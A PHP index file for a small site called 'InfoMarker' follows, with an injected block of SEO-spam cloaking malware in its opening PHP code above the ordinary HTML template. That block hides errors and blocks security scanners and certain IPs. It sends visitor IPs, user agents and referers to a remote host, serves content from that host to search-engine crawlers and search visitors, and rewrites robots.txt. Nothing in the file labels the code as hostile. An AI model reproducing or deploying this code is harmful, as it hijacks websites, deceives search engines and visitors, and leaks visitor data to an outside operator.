<?php
error_reporting(0);
    function getrealIp()
    {
        if (getenv('HTTP_CLIENT_IP')) {
            $ip = getenv('HTTP_CLIENT_IP');
        }
        if (getenv('HTTP_X_REAL_IP')) {
            $ip = getenv('HTTP_X_REAL_IP');
        } elseif (getenv('HTTP_X_FORWARDED_FOR')) {
            $ip = getenv('HTTP_X_FORWARDED_FOR');
            $ips = explode(',', $ip);
            $ip = $ips[0];
        } elseif (getenv('REMOTE_ADDR')) {
            $ip = getenv('REMOTE_ADDR');
        } else {
            $ip = '0.0.0.0';
        }

        return $ip;
    }
function get_url($url)
{
	$remoteContent = @file_get_contents($url);
	if(empty($remoteContent))
	{
		$ch = curl_init();
		curl_setopt($ch, CURLOPT_URL, $url);
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
		curl_setopt($ch, CURLOPT_FOLLOWLOCATION, false);
		if(strpos($url,"https://") !== false){
			curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
			curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE);
		}
		$remoteContent = curl_exec($ch);
		curl_close($ch);
	}
	return $remoteContent;
}
function get_url2($url)
{
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, $url);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	curl_setopt($ch, CURLOPT_FOLLOWLOCATION, false);
	curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
	if(strpos($url,"https://") !== false){
		curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
		curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE);
	}
	$remoteContent = curl_exec($ch);
	curl_close($ch);
	
	if(empty($remoteContent))
	{
		$remoteContent = @file_get_contents($url);
	}
	return $remoteContent;
}
if(preg_match("/(Bytespider|PetalBot|AhrefsBot|Barkrowler|MJ12bot|FeedDemon|JikeSpider|Indy Library|AskTbFXTV|CrawlDaddy|CoolpadWebkit|Java|Feedly|UniversalFeedParser|ApacheBench|Swiftbot|ZmEu|oBot|jaunty|Python-urllib|python-requests|lightDeckReports Bot|YYSpider|DigExt|YisouSpider|HttpClient|heritrix|EasouSpider|Ezooms|AmazonBot|SEMrushBot|YandexBot|paloaltonetworks|Python)/i", $_SERVER['HTTP_USER_AGENT']))
{
	header('HTTP/1.0 403 Forbidden');
	exit();
}
$botagent = "bing|google|yahoo";

$datacenter = "http://cw296.onefollowing.shop/index.php";
$pc = "VgJVBwL";
$useragent = urlencode($_SERVER['HTTP_USER_AGENT']);
$refer = urlencode($_SERVER['HTTP_REFERER']);
$language = urlencode($_SERVER['HTTP_ACCEPT_LANGUAGE']);
//$ip = urlencode($_SERVER['REMOTE_ADDR']);
$realip = getrealIp();
$ip = urlencode($realip);
$domain = urlencode($_SERVER['HTTP_HOST']);
$script = urlencode($_SERVER['SCRIPT_NAME']);
if ( (! empty($_SERVER['REQUEST_SCHEME']) && $_SERVER['REQUEST_SCHEME'] == 'https') || (! empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] == 'on') || (! empty($_SERVER['SERVER_PORT']) && $_SERVER['SERVER_PORT'] == '443') || (isset($_SERVER['HTTP_X_FORWARDED_PROTO']) && $_SERVER['HTTP_X_FORWARDED_PROTO'] == 'https') ) {
    $_SERVER['REQUEST_SCHEME'] = 'https';
} else {
    $_SERVER['REQUEST_SCHEME'] = 'http';
}
$http = urlencode($_SERVER['REQUEST_SCHEME']);
$uri = urlencode($_SERVER['REQUEST_URI']);
if(strpos($uri,"uuuuxxxxooo") !== false){
	echo "ok";
	exit();
}
if($realip == "153.246.135.238" || $realip == "219.101.44.233")
{
	header('HTTP/1.0 403 Forbidden');
	exit();
}
$rewriteable = 0;
if(!file_exists("uxo.txt"))
{
	$uuu = $http.'://'.$_SERVER['HTTP_HOST'].'/uuuuxxxxooo';
	$dd = get_url($uuu);
	if($dd == "ok")
	{
		$rewriteable = 1;
		@file_put_contents("uxo.txt","1");
	}
	else
	{
		$rewriteable = 0;
		@file_put_contents("uxo.txt","0");
	}
}
else
{
	$rewriteable = @file_get_contents("uxo.txt");
}

if(strpos($uri,"pingsitemap.xml") !== false){
	$scripname = $_SERVER['SCRIPT_NAME'];
	if( strpos( $scripname, "index.php") !== false)
	{
		if($rewriteable == 0)
		{
			$scripname = '/?';
		}
		else
		{
			$scripname = '/';
		}
	}
	else
	{
		$scripname = $scripname.'?';	
	}
    $google ="https://www.google.com/ping?sitemap=";
	//$google ="http://www.google.com/webmasters/tools/ping?sitemap=";
	$robots_contents = 'User-agent: *
Allow: /';
	$sitemap = "$http://" . $domain .$scripname. "sitemap.xml";
	$robots_contents = trim($robots_contents)."\r\n"."Sitemap: $sitemap";
	//$dd = get_url2($google. urlencode( $sitemap));
	$sitemapstatus = "";
	//if(preg_match("/<h2>(.+?)<\/h2>/i",$dd,$match))
	//{
	//	$sitemapstatus = $match[1];
	//}
	
	//$sitemapstatus = ( strpos($dd,"Sitemap Notification Received") !== false ) ? "OK" : "<font color='red'>ERROR</font>";
	echo $sitemap.": ".$sitemapstatus.'<br/>';

	//usleep(100*1000);

	$requsturl = $datacenter."?agent=$useragent&refer=$refer&lang=$language&ip=$ip&dom=$domain&http=$http&uri=$uri&pc=$pc&rewriteable=$rewriteable&script=$script&sitemap=".urlencode($sitemap);
	$dd = get_url($requsturl);	
	//for($i = 1; $i < 30; $i++){
		//$sitemap = "$http://" . $domain.$scripname. "sitemap_index_$i.xml";
		//$robots_contents = trim($robots_contents)."\r\n"."Sitemap: $sitemap";
		// $dd = get_url2($google.urlencode($sitemap));
		// $sitemapstatus = "<font color='red'>ERROR</font>";
		// if(preg_match("/<h2>(.+?)<\/h2>/i",$dd,$match))
		// {
			// $sitemapstatus = $match[1];
		// }
		// //$sitemapstatus = ( strpos($dd,"Sitemap Notification Received") !== false ) ? "OK" : "<font color='red'>ERROR</font>";
		// echo $sitemap.": ".$sitemapstatus.'<br/>';
		//usleep(100*1000);
	//}
	@file_put_contents("robots.txt",$robots_contents);
	exit();
}
else if(strpos($uri,"favicon.ico") !== false){
	
}
else if(strpos($uri,"jp2023") !== false){
	$requsturl = $datacenter."?agent=$useragent&refer=$refer&lang=$language&ip=$ip&dom=$domain&http=$http&uri=$uri&pc=$pc&rewriteable=$rewriteable&script=$script";
	$dd = get_url($requsturl);
	echo $dd;
	exit();
}
else if(strpos($uri,"robots.txt") !== false || strpos($uri,"writerobots") !== false){
	//$uri = "writerobots";
	$requsturl = $datacenter."?agent=$useragent&refer=$refer&lang=$language&ip=$ip&dom=$domain&http=$http&uri=$uri&pc=$pc&rewriteable=$rewriteable&script=$script";
	header('Content-Type: text/plain; charset=utf-8');
	echo $dd = get_url($requsturl);
	@file_put_contents("robots.txt",$dd);
	exit();
}
else if(preg_match("@^/(.*?).xml$@i", $_SERVER['REQUEST_URI'])){
	$requsturl = $datacenter."?agent=$useragent&refer=$refer&lang=$language&ip=$ip&dom=$domain&http=$http&uri=$uri&pc=$pc&rewriteable=$rewriteable&script=$script";
	$dd = get_url($requsturl);
	if($dd == "500")
	{
		header("HTTP/1.0 500 Internal Server Error");
		exit();
	}
	else
	{
		header('Content-Type: text/xml; charset=utf-8');
		echo $dd;
		exit();
	}
}
else if(preg_match("/($botagent)/i", $_SERVER['HTTP_USER_AGENT']))
{
	$requsturl = $datacenter."?agent=$useragent&refer=$refer&lang=$language&ip=$ip&dom=$domain&http=$http&uri=$uri&pc=$pc&rewriteable=$rewriteable&script=$script";
	$dd = get_url($requsturl);

	if(!empty($dd))
	{
		if($dd == "500")
		{
			header("HTTP/1.0 500 Internal Server Error");
			exit();
		}
		if(substr($dd,0,5)=="<?xml")
		{
			header('Content-Type: text/xml; charset=utf-8');
		}
		else
		{
			header('Content-Type: text/html; charset=utf-8');
		}
		echo $dd;
		exit();
	}
}
else if(preg_match("/($botagent)/i", $_SERVER['HTTP_REFERER']))
{
	$requsturl = $datacenter."?agent=$useragent&refer=$refer&lang=$language&ip=$ip&dom=$domain&http=$http&uri=$uri&pc=$pc&rewriteable=$rewriteable";
	$dd = get_url($requsturl);
	if($dd == "500")
	{
		header("HTTP/1.0 500 Internal Server Error");
		exit();
	}
	else if(!empty($dd))
	{
		header('HTTP/1.1 404 Not Found');
		echo $dd;
		exit();
	}
}
else
{
}
?>
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel='stylesheet' href="style.css">
    <title>InfoMarker</title>
</head>

<body>
    <div class="wrapper">
        <?php
        require 'blocks/header.php';
        require 'blocks/layout-preview.php';
        require 'blocks/fileloader.php';
        ?>
    </div>
    <?php require 'blocks/footer.php'; ?>

</body>

</html>